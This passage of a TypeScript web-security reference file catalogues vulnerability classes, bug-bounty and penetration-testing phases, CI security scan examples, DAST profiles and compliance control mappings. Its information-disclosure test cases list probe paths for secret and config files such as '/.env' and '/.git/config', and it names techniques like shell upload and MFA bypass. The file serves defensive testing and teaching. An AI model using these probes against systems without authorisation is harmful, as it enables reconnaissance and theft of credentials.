        indicators: ["Subsequent HTML captured as img src parameter"],
        automatable: false,
      },
    ],
    remediation: [
      "Use hash-based or nonce-based CSP instead of domain allowlists",
      "Audit whitelisted domains for JSONP endpoints",
      "Use strict-dynamic for script loading",
      "Set default-src 'none' and explicitly allow each resource type",
    ],
    references: ["https://portswigger.net/web-security/cross-site-scripting/content-security-policy"],
  },
  {
    id: "vuln-info-disclosure",
    name: "Information Disclosure",
    category: "info-disclosure",
    severity: "medium",
    cwes: ["CWE-200"],
    owaspTopTen: "A05:2021 – Security Misconfiguration",
    description: "Application inadvertently reveals sensitive information through error messages, debug pages, HTTP headers, backup files, or source code exposure.",
    impact: "Attack surface mapping, credential discovery, internal architecture disclosure",
    detectionMethods: ["dast", "crawling", "manual"],
    testCases: [
      {
        name: "Verbose Error Messages",
        technique: "Trigger errors to reveal stack traces, database details, file paths",
        indicators: ["Stack trace in response", "Database connection string", "File paths"],
        automatable: true,
      },
      {
        name: "Source Map Exposure",
        technique: "Access .map files to recover original source code",
        payloads: ["/static/js/main.js.map", "/assets/app.css.map"],
        indicators: ["Source map file accessible in production"],
        automatable: true,
      },
      {
        name: "Backup/Config File Exposure",
        technique: "Access common backup file paths",
        payloads: ["/web.config", "/.env", "/config.yml.bak", "/.git/config"],
        indicators: ["Configuration or backup file accessible"],
        automatable: true,
      },
    ],
    remediation: [
      "Use generic error pages in production (no stack traces)",
      "Remove source maps from production builds",
      "Block access to .git, .env, backup files via server config",
      "Strip server version headers (Server, X-Powered-By)",
      "Audit exposed endpoints with directory brute-forcing",
    ],
    references: ["https://portswigger.net/web-security/information-disclosure"],
  },
];

// ─────────────────────────────────────────────────────────────────────────────
//  2. Bug Bounty Hunting Methodology
// ─────────────────────────────────────────────────────────────────────────────

export const BUG_BOUNTY_METHODOLOGY: BugBountyMethodology[] = [
  {
    phase: "Scope Analysis & Target Selection",
    objective: "Understand the program rules, identify high-value targets, prioritize attack surface",
    techniques: [
      "Read program policy: scope, exclusions, severity ratings, payout ranges",
      "Identify target types: main web app, API, mobile, subdomains, cloud assets",
      "Review previous disclosures / public bug reports for patterns",
      "Map asset types: wildcard domains (*. scope) vs specific URLs",
      "Check for recently added features (changelog, blog posts, release notes)",
    ],
    tools: ["Program policy page", "HackerOne/Bugcrowd", "Release notes", "Wayback Machine"],
    timeEstimate: "1-2 hours",
    deliverables: ["Target list (prioritized)", "Scope boundaries documented", "Previous bug patterns"],
  },
  {
    phase: "Reconnaissance & Asset Discovery",
    objective: "Map the complete attack surface including subdomains, APIs, and hidden endpoints",
    techniques: [
      "Subdomain enumeration (passive DNS, certificate transparency, brute-force)",
      "Port scanning and service fingerprinting",
      "Content discovery (directory/file brute-forcing)",
      "JavaScript analysis for API endpoints and secrets",
      "Technology fingerprinting (Wappalyzer, headers, cookies, error pages)",
      "API documentation discovery (Swagger/OpenAPI, GraphQL introspection)",
      "Cloud asset enumeration (S3 buckets, Azure blobs, GCS)",
    ],
    tools: ["subfinder", "amass", "httpx", "nuclei", "ffuf", "Burp Suite", "hakrawler", "gau", "waybackurls", "trufflehog"],
    timeEstimate: "2-6 hours",
    deliverables: ["Subdomain list", "Open port map", "Technology stack", "API endpoint list", "Interesting files/paths"],
  },
  {
    phase: "Vulnerability Discovery & Testing",
    objective: "Systematically test for vulnerabilities across the attack surface",
    techniques: [
      "Injection testing: SQLi, XSS (reflected/stored/DOM), SSTI, command injection",
      "Authentication testing: default creds, brute-force, token analysis, OAuth flows",
      "Authorization testing: IDOR, privilege escalation, BOLA, BFLA",
      "Business logic: workflow bypass, race conditions, negative values, coupon abuse",
      "SSRF testing: internal network access, cloud metadata, protocol smuggling",
      "File upload: shell upload, extension bypass, content-type bypass",
      "API-specific: mass assignment, excessive data exposure, broken rate limiting",
    ],
    tools: ["Burp Suite Professional", "sqlmap", "Nuclei", "Dalfox", "jwt_tool", "Postman", "ffuf"],
    timeEstimate: "4-20 hours",
    deliverables: ["Vulnerability findings", "PoC scripts/requests", "Screenshot evidence"],
  },
  {
    phase: "Exploitation & Impact Demonstration",
    objective: "Prove exploitability and demonstrate real-world impact",
    techniques: [
      "Develop working proof-of-concept (PoC) — minimal, reproducible",
      "Chain vulnerabilities for higher impact (e.g., XSS → Account Takeover)",
      "Document step-by-step reproduction steps",
      "Calculate CVSS 3.1 score with justification",
      "Assess impact: data exposure, financial loss, user count affected",
    ],
    tools: ["Burp Suite", "Custom scripts", "curl", "Browser DevTools"],
    timeEstimate: "1-4 hours per finding",
    deliverables: ["PoC code", "CVSS assessment", "Impact statement"],
  },
  {
    phase: "Report Writing & Submission",
    objective: "Write clear, actionable vulnerability report that earns maximum payout",
    techniques: [
      "Title: Clear, specific (e.g., 'Stored XSS in user profile via display name')",
      "Summary: 1-2 sentences of impact",
      "Steps to reproduce: numbered, exact, with URLs and parameters",
      "Impact: what an attacker can do, who is affected, data at risk",
      "Remediation: specific fix suggestions (not just 'validate input')",
      "Attachments: screenshots, HTTP requests/responses, PoC script",
      "CVSS score with vector string",
    ],
    tools: ["Markdown editor", "Burp Suite report export", "Screen recorder"],
    timeEstimate: "30-60 min per report",
    deliverables: ["Vulnerability report", "Supporting evidence files"],
  },
];

// ─────────────────────────────────────────────────────────────────────────────
//  3. DevSecOps Pipeline Integration
// ─────────────────────────────────────────────────────────────────────────────

export const DEVSECOPS_PIPELINE_STAGES = {
  shiftLeft: {
    name: "Shift-Left Security",
    description: "Integrate security early in the development lifecycle",
    practices: [
      "Pre-commit hooks: secret scanning (gitleaks, trufflehog), linting",
      "IDE plugins: security linting (ESLint security rules, Semgrep)",
      "Design reviews: threat modeling (STRIDE), security requirements",
      "Security training: OWASP Top 10, secure coding guidelines",
    ],
  },
  commitStage: {
    name: "Commit Stage",
    description: "Security checks on every commit/PR",
    practices: [
      "SAST scan on changed files (Semgrep, CodeQL, SonarQube)",
      "Secret detection (gitleaks pre-commit hook)",
      "Dependency vulnerability scan (npm audit, Snyk, Dependabot)",
      "License compliance check",
      "Unit test security assertions (auth, input validation)",
    ],
    ciExample: `# GitHub Actions — Commit Stage Security
name: security-commit
on: [pull_request]
jobs:
  sast:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: returntocorp/semgrep-action@v1
        with:
          config: p/owasp-top-ten p/typescript
  secrets:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }
      - uses: gitleaks/gitleaks-action@v2
  dependencies:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm audit --audit-level=high`,
  },
  buildStage: {
    name: "Build Stage",
    description: "Security validation during build process",
    practices: [
      "Container image scanning (Trivy, Grype)",
      "SBOM generation (syft, cyclonedx)",
      "Build reproducibility verification",
      "Artifact signing (cosign, Sigstore)",
    ],
    ciExample: `# Container Security Scanning
- name: Scan container image
  uses: aquasecurity/trivy-action@master
  with:
    image-ref: my-app:\${{ "github.sha" }}
    severity: CRITICAL,HIGH
    exit-code: 1`,
  },
  testStage: {
    name: "Test Stage",
    description: "Dynamic security testing in staging environment",
    practices: [
      "DAST scan against staging (Burp Suite DAST, OWASP ZAP, Nuclei)",
      "API security testing (automated OpenAPI fuzzing)",
      "Integration security tests (auth flows, RBAC, rate limiting)",
      "Performance/DoS baseline testing",
    ],
    ciExample: `# DAST Scanning in CI
- name: OWASP ZAP Baseline
  uses: zaproxy/action-baseline@v0.10.0
  with:
    target: https://staging.example.com
    rules_file_name: .zap/rules.tsv
    fail_action: warn`,
  },
  deployStage: {
    name: "Deploy Stage",
    description: "Security gates before production deployment",
    practices: [
      "Security sign-off gate (critical/high findings block deploy)",
      "Infrastructure security validation (Checkov, tfsec for IaC)",
      "Runtime protection configuration (WAF, CSP headers, rate limits)",
      "Canary deployment with security monitoring",
    ],
  },
  monitorStage: {
    name: "Monitor & Respond",
    description: "Runtime security monitoring and incident response",
    practices: [
      "Web Application Firewall (WAF) with managed rules",
      "Runtime Application Self-Protection (RASP) for critical apps",
      "Security event logging and SIEM integration",
      "Vulnerability disclosure program / bug bounty",
      "Incident response playbooks",
      "Dependency update automation (Dependabot, Renovate)",
    ],
  },
} as const;

// ─────────────────────────────────────────────────────────────────────────────
//  4. Penetration Testing Methodology (PTES-aligned)
// ─────────────────────────────────────────────────────────────────────────────

export const PENTEST_METHODOLOGY: PentestMethodology[] = [
  {
    phase: "Pre-Engagement",
    objective: "Define scope, rules, and logistics before testing begins",
    activities: [
      "Negotiate and sign scope document defining in-scope targets",
      "Establish Rules of Engagement (ROE) with hard limits",
      "Define communication channels and emergency contacts",
      "Set up test accounts and VPN/access credentials",
      "Schedule testing windows (avoid production peaks)",
      "Confirm insurance and liability coverage",
    ],
    tools: ["ROE template", "Scope document", "NDA"],
    outputs: ["Signed SOW", "ROE document", "Test credentials", "Communication plan"],
    riskLevel: "low",
  },
  {
    phase: "Intelligence Gathering (OSINT)",
    objective: "Collect publicly available information about the target",
    activities: [
      "DNS enumeration: subdomains, MX, TXT records, zone transfers",
      "WHOIS and registrar information",
      "Certificate Transparency log analysis",
      "Search engine dorking (site:, filetype:, inurl:)",
      "Social media and employee profiling",
      "Technology stack fingerprinting",
      "Cloud asset discovery (S3, Azure Blob, GCS enumeration)",
      "Code repository scanning (GitHub, GitLab for leaks)",
    ],
    tools: ["subfinder", "amass", "theHarvester", "Shodan", "Censys", "crt.sh", "Google Dorks", "trufflehog"],
    outputs: ["Subdomain list", "Technology profile", "Email/username list", "Exposed credentials"],
    riskLevel: "low",
  },
  {
    phase: "Scanning & Enumeration",
    objective: "Actively probe targets to map services and identify potential vulnerabilities",
    activities: [
      "Port scanning: TCP/UDP service discovery (nmap, masscan)",
      "Service version detection and banner grabbing",
      "Web application crawling and content discovery",
      "SSL/TLS configuration assessment (testssl.sh)",
      "Automated vulnerability scanning (Nuclei, Nessus)",
      "Manual endpoint analysis and parameter fuzzing",
    ],
    tools: ["nmap", "masscan", "Burp Suite", "Nuclei", "testssl.sh", "ffuf", "nikto"],
    outputs: ["Port/service inventory", "Vulnerability scan report", "SSL/TLS assessment", "Endpoint map"],
    riskLevel: "medium",
  },
  {
    phase: "Vulnerability Analysis",
    objective: "Analyze discovered issues to confirm exploitability and assess risk",
    activities: [
      "Validate automated scanner findings (eliminate false positives)",
      "Manual testing of OWASP Top 10 categories",
      "Authentication and session management analysis",
      "API security testing (REST, GraphQL, WebSocket)",
      "Business logic testing",
      "Client-side security review (CSP, CORS, cookie flags)",
    ],
    tools: ["Burp Suite Professional", "sqlmap", "jwt_tool", "Postman", "Browser DevTools"],
    outputs: ["Confirmed vulnerability list", "CVSS scoring", "Attack trees"],
    riskLevel: "medium",
  },
  {
    phase: "Exploitation",
    objective: "Demonstrate real impact by exploiting confirmed vulnerabilities",
    activities: [
      "Develop targeted exploits / proof-of-concept",
      "Attempt privilege escalation (horizontal and vertical)",
      "Test vulnerability chaining for maximum impact",
      "Document exact reproduction steps and evidence",
      "Assess blast radius (what data/systems are accessible)",
    ],
    tools: ["Burp Suite", "Metasploit", "Custom scripts", "curl", "sqlmap"],
    outputs: ["Exploitation evidence", "PoC code/scripts", "Impact assessment"],
    riskLevel: "high",
  },
  {
    phase: "Post-Exploitation & Reporting",
    objective: "Clean up, document findings, and deliver actionable report",
    activities: [
      "Remove all test artifacts, accounts, and uploaded files",
      "Document each finding with: title, severity, CVSS, description, PoC, remediation",
      "Prioritize findings by risk (CVSS × business context)",
      "Write executive summary for non-technical stakeholders",
      "Prepare technical appendix with full evidence",
      "Present findings to client team with Q&A",
      "Schedule retest after remediation period",
    ],
    tools: ["Report template", "CVSS calculator", "Screenshot tools", "Markdown/PDF generator"],
    outputs: ["Executive summary", "Technical report", "Finding spreadsheet", "Retest schedule"],
    riskLevel: "low",
  },
];

// ─────────────────────────────────────────────────────────────────────────────
//  5. DAST Scan Profiles
// ─────────────────────────────────────────────────────────────────────────────

export const DAST_SCAN_PROFILES: DASTScanProfile[] = [
  {
    id: "dast-full",
    name: "Full DAST Scan",
    description: "Comprehensive dynamic scan covering all PortSwigger 160+ scan checks. For staging environments and scheduled assessments.",
    scanChecks: [
      "SQL injection (error, blind boolean, blind time, UNION, stacked)",
      "Cross-site scripting (reflected, stored, DOM-based)",
      "CSRF token analysis",
      "Server-side request forgery (SSRF)",
      "XML external entity injection (XXE)",
      "Path traversal / directory traversal",
      "OS command injection",
      "LDAP injection",
      "Server-side template injection (SSTI)",
      "HTTP request smuggling (CL.TE, TE.CL, H2)",
      "WebSocket security (CSWSH, message injection)",
      "Insecure deserialization",
      "JWT vulnerabilities (none alg, algorithm confusion, kid injection)",
      "OAuth/OpenID flaws (state, redirect_uri, token leakage)",
      "CORS misconfiguration",
      "Clickjacking (missing X-Frame-Options, frame-ancestors)",
      "HTTP header injection / response splitting",
      "Open redirect",
      "Information disclosure (source maps, .git, .env, stack traces)",
      "Missing security headers (HSTS, CSP, X-Content-Type-Options)",
      "Cookie security (Secure, HttpOnly, SameSite flags)",
      "GraphQL vulnerabilities (introspection, depth, batch attacks)",
      "File upload vulnerabilities",
      "Prototype pollution",
      "Race conditions (concurrent request testing)",
      "Business logic (negative values, workflow bypass)",
    ],
    crawlConfig: {
      maxDepth: 10,
      maxPages: 5000,
      followRedirects: true,
      handleForms: true,
      handleJavascript: true,
      excludePatterns: ["/logout", "/signout", "/delete-account"],
    },
    ciIntegration: {
      platforms: ["GitHub Actions", "GitLab CI", "Jenkins", "Azure DevOps"],
      failOnSeverity: "high",
      reportFormats: ["SARIF", "HTML", "JSON", "JUnit XML"],
      maxScanDuration: "4h",
      baselineComparison: true,
    },
    compliance: ["OWASP Top 10", "PCI DSS 4.0", "SOC 2 Type II"],
  },
  {
    id: "dast-cicd",
    name: "CI/CD Pipeline Scan (Fast)",
    description: "Lightweight DAST scan optimized for CI/CD pipeline speed. Covers critical vulnerabilities only. Target: <15 min scan time.",
    scanChecks: [
      "SQL injection (error-based, UNION)",
      "XSS (reflected)",
      "SSRF (basic)",
      "Path traversal",
      "OS command injection",
      "Missing security headers",
      "Cookie security flags",
      "Open redirect",
      "Information disclosure (common patterns)",
    ],
    crawlConfig: {
      maxDepth: 3,
      maxPages: 200,
      followRedirects: true,
      handleForms: true,
      handleJavascript: false,
      excludePatterns: ["/admin/*", "/logout", "/api/v*/internal/*"],
    },
    ciIntegration: {
      platforms: ["GitHub Actions", "GitLab CI", "Jenkins", "Azure DevOps"],
      failOnSeverity: "critical",
      reportFormats: ["SARIF", "JSON"],
      maxScanDuration: "15m",
      baselineComparison: true,
    },
    compliance: ["OWASP Top 10"],
  },
  {
    id: "dast-api",
    name: "API Security Scan",
    description: "Targeted scanning for REST/GraphQL APIs using OpenAPI/Swagger specs. Tests API-specific vulnerability classes.",
    scanChecks: [
      "BOLA (Broken Object Level Authorization)",
      "BFLA (Broken Function Level Authorization)",
      "Mass assignment / excessive data exposure",
      "SQL injection via API parameters",
      "NoSQL injection",
      "Rate limiting bypass",
      "JWT vulnerabilities",
      "GraphQL introspection / depth attack",
      "API versioning exposure (old versions accessible)",
      "Missing authentication on endpoints",
      "Input validation (type coercion, boundary values)",
      "SSRF via API parameters (URL fields)",
    ],
    crawlConfig: {
      maxDepth: 1,
      maxPages: 1000,
      followRedirects: false,
      handleForms: false,
      handleJavascript: false,
      excludePatterns: [],
      authentication: { type: "bearer", tokenHeader: "Authorization" },
    },
    ciIntegration: {
      platforms: ["GitHub Actions", "GitLab CI", "Jenkins", "Azure DevOps"],
      failOnSeverity: "high",
      reportFormats: ["SARIF", "JSON", "OpenAPI annotation"],
      maxScanDuration: "30m",
      baselineComparison: true,
    },
    compliance: ["OWASP API Security Top 10", "PCI DSS 4.0"],
  },
  {
    id: "dast-auth",
    name: "Authentication & Authorization Scan",
    description: "Focused scan on authentication mechanisms, session management, and authorization controls.",
    scanChecks: [
      "Username enumeration (timing, error messages)",
      "Brute-force resistance (lockout policy)",
      "Password policy enforcement",
      "Session token entropy / predictability",
      "Session fixation",
      "Session invalidation on logout",
      "JWT vulnerabilities",
      "OAuth 2.0 flow testing",
      "MFA bypass techniques",
      "Password reset token predictability",
      "IDOR / horizontal privilege escalation",
      "Vertical privilege escalation (role tampering)",
      "Cookie security attributes",
    ],
    crawlConfig: {
      maxDepth: 5,
      maxPages: 500,
      followRedirects: true,
      handleForms: true,
      handleJavascript: true,
      excludePatterns: [],
      authentication: { type: "form", loginUrl: "/login" },
    },
    ciIntegration: {
      platforms: ["GitHub Actions", "GitLab CI"],
      failOnSeverity: "high",
      reportFormats: ["SARIF", "HTML", "JSON"],
      maxScanDuration: "1h",
      baselineComparison: false,
    },
    compliance: ["OWASP Top 10", "NIST 800-63"],
  },
];

// ─────────────────────────────────────────────────────────────────────────────
//  6. Compliance Frameworks
// ─────────────────────────────────────────────────────────────────────────────

export const COMPLIANCE_FRAMEWORKS: ComplianceFramework[] = [
  {
    id: "owasp-top10-2021",
    name: "OWASP Top 10",
    version: "2021",
    controls: [
      {
        id: "A01",
        name: "Broken Access Control",
        requirement: "Enforce server-side access control; default deny; CORS minimization",
        testProcedure: "Test IDOR, BOLA, privilege escalation, CORS, directory listing",
        evidenceRequired: ["Access control matrix", "DAST scan results", "Manual test results"],
        automatable: true,
        scanChecks: ["IDOR", "CORS misconfiguration", "Directory listing", "Force browsing"],
      },
      {
        id: "A02",
        name: "Cryptographic Failures",
        requirement: "Encrypt sensitive data in transit and at rest; use strong algorithms",
        testProcedure: "SSL/TLS config review, encryption of PII/credentials, key management audit",
        evidenceRequired: ["SSL scan results", "Data flow diagram", "Encryption inventory"],
        automatable: true,
        scanChecks: ["SSL/TLS assessment", "Weak ciphers", "Missing HSTS", "Cleartext transmission"],
      },
      {
        id: "A03",
        name: "Injection",
        requirement: "Use parameterized queries; validate/sanitize all input; context-aware encoding",
        testProcedure: "SQLi, XSS, command injection, LDAP injection testing across all inputs",
        evidenceRequired: ["SAST results", "DAST results", "Code review attestation"],
        automatable: true,
        scanChecks: ["SQL injection", "XSS", "Command injection", "SSTI", "LDAP injection"],
      },
      {
        id: "A04",
        name: "Insecure Design",
        requirement: "Threat modeling; secure design patterns; business logic validation",
        testProcedure: "Business logic testing, workflow bypass, race conditions, abuse cases",
        evidenceRequired: ["Threat model", "Design review", "Abuse case test results"],
        automatable: false,
        scanChecks: ["Race conditions", "Business logic", "Workflow bypass"],
      },
      {
        id: "A05",
        name: "Security Misconfiguration",
        requirement: "Hardened configs; remove defaults; security headers; disable unnecessary features",
        testProcedure: "Header analysis, default creds, unnecessary endpoints, stack traces",
        evidenceRequired: ["Header scan", "Config review", "Default credential audit"],
        automatable: true,
        scanChecks: ["Missing headers", "Default credentials", "Verbose errors", "Debug mode"],
      },
      {
        id: "A06",
        name: "Vulnerable and Outdated Components",
        requirement: "Inventory and patch all dependencies; remove unused components",
        testProcedure: "SCA scan, SBOM review, CVE monitoring",
        evidenceRequired: ["SBOM", "Dependency scan results", "Patch management policy"],
        automatable: true,
        scanChecks: ["npm audit", "Snyk scan", "CVE database check"],
      },
      {
        id: "A07",
        name: "Identification and Authentication Failures",
        requirement: "Strong auth mechanisms; MFA; secure session management; credential storage",
        testProcedure: "Password policy, session management, brute-force protection, JWT security",
        evidenceRequired: ["Auth flow review", "Session analysis", "Brute-force test results"],
        automatable: true,
        scanChecks: ["Username enumeration", "Session token entropy", "JWT analysis", "MFA bypass"],
      },
      {
        id: "A08",
        name: "Software and Data Integrity Failures",
        requirement: "Verify integrity of updates, critical data, and CI/CD pipelines",
        testProcedure: "Deserialization testing, CI/CD pipeline review, SRI check",
        evidenceRequired: ["Pipeline security review", "SRI verification", "Signing verification"],
        automatable: true,
        scanChecks: ["Insecure deserialization", "Missing SRI", "Unsigned artifacts"],
      },
      {
        id: "A09",
        name: "Security Logging and Monitoring Failures",
        requirement: "Log security events; implement alerting; maintain audit trail",
        testProcedure: "Verify logging of auth failures, access control failures, input validation failures",
        evidenceRequired: ["Logging config review", "Alert rules", "Incident response plan"],
        automatable: false,
        scanChecks: ["Log review", "Alert configuration audit"],
      },
      {
        id: "A10",
        name: "Server-Side Request Forgery (SSRF)",
        requirement: "Validate/sanitize URLs; use allowlists; block internal IP ranges",
        testProcedure: "SSRF testing against URL parameters, redirect handlers, file importers",
        evidenceRequired: ["DAST SSRF results", "Network segmentation verification"],
        automatable: true,
        scanChecks: ["SSRF (basic)", "SSRF (blind)", "Cloud metadata access"],
      },
    ],
  },
  {
    id: "pci-dss-4",
    name: "PCI DSS",
    version: "4.0",
    controls: [
      {
        id: "6.4.1",
        name: "Public-Facing Web Application Protection",
        requirement: "Protect public-facing web applications against attacks (WAF or DAST review)",
        testProcedure: "Run DAST scan against all public-facing web apps at least annually and after changes",
        evidenceRequired: ["DAST scan report", "WAF configuration", "Remediation tracking"],
        automatable: true,
        scanChecks: ["Full DAST scan", "WAF bypass testing"],
      },
      {
        id: "6.4.2",
        name: "Automated Technical Solution for Web-Based Attacks",
        requirement: "Deploy automated solution (WAF) to detect and prevent web-based attacks",
        testProcedure: "Verify WAF is active, rules updated, blocking OWASP Top 10 attacks",
        evidenceRequired: ["WAF deployment evidence", "Rule update logs", "Blocking verification"],
        automatable: true,
        scanChecks: ["WAF detection", "WAF bypass"],
      },
      {
        id: "6.5.x",
        name: "Secure Development Practices",
        requirement: "Address common coding vulnerabilities in development (injection, XSS, CSRF, etc.)",
        testProcedure: "Code review, SAST scan, developer training verification",
        evidenceRequired: ["SAST results", "Training records", "Code review logs"],
        automatable: true,
        scanChecks: ["SQL injection", "XSS", "CSRF", "Buffer overflow"],
      },
      {
        id: "11.3",
        name: "Penetration Testing",
        requirement: "Perform internal and external penetration testing at least annually",
        testProcedure: "External and internal pentest by qualified personnel",
        evidenceRequired: ["Pentest report", "Remediation evidence", "Retest results"],
        automatable: false,
        scanChecks: ["Full pentest methodology"],
      },
    ],
  },
  {
    id: "soc2-type2",
    name: "SOC 2 Type II",
    version: "2024",
    controls: [
      {
        id: "CC6.1",
        name: "Logical and Physical Access Controls",
        requirement: "Restrict logical access to authorized users; enforce MFA; review access quarterly",
        testProcedure: "Access review, MFA verification, privilege audit",
        evidenceRequired: ["Access review report", "MFA enrollment evidence", "Privilege matrix"],
        automatable: true,
        scanChecks: ["Auth testing", "RBAC verification", "MFA coverage"],
      },
      {
        id: "CC6.6",
        name: "Security for Information Transmitted",
        requirement: "Protect data in transit using encryption (TLS 1.2+)",
        testProcedure: "SSL/TLS scanning, certificate validation, cipher suite review",
        evidenceRequired: ["SSL scan results", "Certificate inventory"],
        automatable: true,
        scanChecks: ["SSL/TLS assessment", "HSTS verification"],
      },
      {
        id: "CC7.2",
        name: "Monitoring for Unauthorized Activity",
        requirement: "Monitor infrastructure and data for indicators of security events",
        testProcedure: "Log review, SIEM alert review, incident response drill",
        evidenceRequired: ["SIEM configuration", "Alert logs", "Incident response records"],
        automatable: false,
        scanChecks: ["Log analysis", "Alerting verification"],
      },
      {
        id: "CC8.1",
        name: "Change Management",
        requirement: "Authorize, design, develop, test, approve, and implement changes",
        testProcedure: "CI/CD pipeline review, approval workflow, testing evidence",
        evidenceRequired: ["Change records", "CI/CD pipeline config", "Test results"],
        automatable: true,
        scanChecks: ["Pipeline security review"],
      },
    ],
  },
  {
    id: "gdpr-security",
    name: "GDPR (Security Articles)",
    version: "2018",
    controls: [
      {
        id: "Art.25",
        name: "Data Protection by Design and Default",
        requirement: "Implement data protection principles from the design stage",
        testProcedure: "Privacy impact assessment, data minimization review, encryption review",
        evidenceRequired: ["DPIA report", "Data flow mapping", "Privacy controls inventory"],
        automatable: false,
        scanChecks: ["PII exposure detection", "Encryption verification"],
      },
      {
        id: "Art.32",
        name: "Security of Processing",
        requirement: "Implement appropriate technical and organizational security measures",
        testProcedure: "Vulnerability assessment, penetration testing, access control review",
        evidenceRequired: ["Pentest report", "Vuln scan results", "Security policy"],
        automatable: true,
        scanChecks: ["Full DAST scan", "Access control testing"],
      },
      {
        id: "Art.33",
        name: "Notification of Data Breach",
        requirement: "Notify supervisory authority within 72 hours of becoming aware of a breach",
        testProcedure: "Incident response plan review, breach notification drill",
        evidenceRequired: ["IR plan", "Breach notification template", "Drill records"],
        automatable: false,
        scanChecks: [],
      },
    ],
  },
  {
    id: "iso-27001",
    name: "ISO 27001",
    version: "2022",
    controls: [
      {
        id: "A.8.8",
        name: "Management of Technical Vulnerabilities",
        requirement: "Continuously identify, evaluate, and treat technical vulnerabilities",
        testProcedure: "Regular vulnerability scanning, patch management, risk assessment",
        evidenceRequired: ["Vuln scan reports", "Patch records", "Risk register"],
        automatable: true,
        scanChecks: ["DAST scan", "Dependency scan", "Infrastructure scan"],
      },
      {
        id: "A.8.9",
        name: "Configuration Management",
        requirement: "Establish, implement, and maintain security configurations",
        testProcedure: "Configuration baseline review, hardening verification",
        evidenceRequired: ["Configuration standards", "Hardening checklist", "Deviation report"],
        automatable: true,
        scanChecks: ["Security header review", "Default config detection", "Debug mode detection"],
      },
      {
        id: "A.8.28",
        name: "Secure Coding",
        requirement: "Apply secure coding practices throughout software development",
        testProcedure: "SAST scan, code review, developer training verification",
        evidenceRequired: ["SAST results", "Code review records", "Training certificates"],
        automatable: true,
        scanChecks: ["SAST scan results", "Security linting"],
      },
    ],
  },
];

// ─────────────────────────────────────────────────────────────────────────────
//  Lookup Helpers
// ─────────────────────────────────────────────────────────────────────────────

export function getVulnByCategory(category: WebSecurityCategory): VulnerabilityClass[] {
  return VULNERABILITY_CLASSES.filter((v) => v.category === category);
}

export function getVulnBySeverity(severity: VulnerabilityClass["severity"]): VulnerabilityClass[] {
  return VULNERABILITY_CLASSES.filter((v) => v.severity === severity);
}

export function getVulnById(id: string): VulnerabilityClass | undefined {
  return VULNERABILITY_CLASSES.find((v) => v.id === id);
}

export function getComplianceFramework(id: string): ComplianceFramework | undefined {
  return COMPLIANCE_FRAMEWORKS.find((f) => f.id === id);
}

export function getDASTProfile(id: string): DASTScanProfile | undefined {
  return DAST_SCAN_PROFILES.find((p) => p.id === id);
}

export function getAutomatableVulns(): VulnerabilityClass[] {
  return VULNERABILITY_CLASSES.filter((v) =>
    v.testCases.some((tc) => tc.automatable)
  );
}

export function getVulnCountBySeverity(): Record<string, number> {
  const counts: Record<string, number> = {};
  for (const v of VULNERABILITY_CLASSES) {
    counts[v.severity] = (counts[v.severity] ?? 0) + 1;
  }
  return counts;
}
